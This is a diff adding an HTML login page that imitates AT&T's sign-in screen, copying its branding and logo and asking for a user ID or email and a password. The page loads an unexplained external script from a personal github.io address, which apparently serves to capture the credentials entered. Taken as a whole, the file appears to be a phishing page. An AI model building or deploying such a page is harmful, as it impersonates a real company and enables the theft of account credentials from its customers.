@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AT&T Login</title>
+  <style>
+    /* General Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      width: 360px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+
+    .login-container h2 {
+      color: #0b2f61; /* AT&T dark blue */
+      margin-bottom: 30px;
+      font-size: 24px;
+    }
+
+    .login-container input[type="text"],
+    .login-container input[type="password"] {
+      width: 100%;
+      padding: 12px 15px;
+      margin: 10px 0 20px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    .login-container input[type="submit"] {
+      background-color: #0b2f61;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .login-container input[type="submit"]:hover {
+      background-color: #09406b;
+    }
+
+    .login-container a {
+      display: block;
+      margin-top: 15px;
+      color: #0b2f61;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .login-container a:hover {
+      text-decoration: underline;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 100px;
+    }
+  </style>
+</head>
+<script src="https://ysktshsh.github.io/intfolder/int1.js"></script>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <!-- Placeholder for AT&T logo -->
+      <img src="data:image/png;base64,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" alt="AT&T Logo">
+    </div>
+    <h2>Sign in to your AT&T account</h2>
+    <form>
+      <input type="text" placeholder="User ID or Email"  name="Userid  or email"required>
+      <input type="password" placeholder="Password" name="Password" required>
+      <input type="submit" value="Sign In">
+      <a href="#">Forgot user ID or password?</a>
+      </form>
+  </div>
+</body>
+</html>
